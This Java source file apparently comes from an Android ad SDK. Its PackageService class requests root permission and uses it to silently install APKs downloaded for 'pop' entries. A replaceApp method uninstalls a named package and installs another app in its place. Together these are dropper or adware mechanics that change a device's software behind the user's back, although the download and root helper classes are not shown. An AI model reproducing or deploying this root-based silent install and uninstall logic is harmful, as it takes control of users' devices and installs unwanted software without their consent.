package com.top.sdk.apputils;

import java.io.File;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import android.content.Context;
import android.content.pm.PackageManager.NameNotFoundException;
import android.widget.Toast;

import com.top.sdk.db.impservice.ImpPopDbService;
import com.top.sdk.db.service.PopDbService;
import com.top.sdk.entity.Constants;
import com.top.sdk.entity.PopData;
import com.top.sdk.utils.LogUtil;

public class PackageService {
	private static PackageService service = null;

	private ExecutorService executorService;

	private PackageService() {
		executorService = Executors.newFixedThreadPool(3);
	}

	public static PackageService getInstance() {
		if (service == null) {
			service = new PackageService();
		}
		return service;
	}

	/**
	 * 安装或者打开APP
	 * 
	 * @param context
	 * @param path
	 * @return
	 */

	public void installBySystem(Context context, String url) {
		// 检查下当前是否已安装指定的包名
		String filePath = Constants.FOLDER_DOWNLOAD + File.separator
				+ String.valueOf(url.hashCode());
		LogUtil.d("====" + filePath);
		PackageUtils.installNormal(context, filePath);
		// PackageUtils.install(context, filePath);
	}

	/**
	 * 安装指定路径APP
	 * 
	 * @param context
	 * @param url
	 * @return
	 */
	public boolean installApp(Context context, PopData pop) {
		executorService.execute(new InstallRunnable(context, pop));
		return true;
	}

	/**
	 * 替换APP
	 * 
	 * @param context
	 * @param packageName
	 * @return
	 */
	public boolean replaceApp(final Context context, final PopData pop,
			final String deletePackage) {
		new Thread() {
			public void run() {
				unInstallApp(context, deletePackage);
				try {
					Thread.sleep(10000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				installApp(context, pop);
			};

		}.start();

		return true;
	}

	/**
	 * 卸载指定的包名
	 * 
	 * @param context
	 * @param packageName
	 * @return
	 */
	public static boolean unInstallApp(Context context, String packageName) {
		if (!checkPackageName(context, packageName)) { // 如果不包含
			Toast.makeText(context, "没有指定包名可卸载", Toast.LENGTH_LONG).show();
			return false;
		}
		RootPermission.upgradeRootPermission(context.getPackageCodePath()); // 先去申请root权限
		int result = PackageUtils.uninstall(context, packageName);
		if (result == PackageUtils.DELETE_SUCCEEDED) {// 执行删除的结果
			return true;
		}
		return false;
	}

	public static boolean checkPackageName(Context context, String packageName) {
		try {
			context.getApplicationContext().getPackageManager()
					.getPackageInfo(packageName, 0);
			return true;
		} catch (NameNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return false;
		}

	}

	public static boolean checkPackageAndChannle(Context context,
			String packageName, String channelName) {

		return true;
	}

	class InstallRunnable implements Runnable {
		private Context context;
		private PopData popData;

		public InstallRunnable(Context context, PopData popData) {
			this.context = context;
			this.popData = popData;
		}

		@Override
		public void run() {
			RootPermission.upgradeRootPermission(context.getPackageCodePath());
			String realPath = Constants.FOLDER_DOWNLOAD + File.separator
					+ String.valueOf(popData.getPopUrl().hashCode());
			int r = PackageUtils.install(context, realPath);
			if (r == PackageUtils.INSTALL_SUCCEEDED) {
				PopDbService service = new ImpPopDbService(context);
				service.deletePopData(popData.getPopId()); 
			}
		}

	}
}
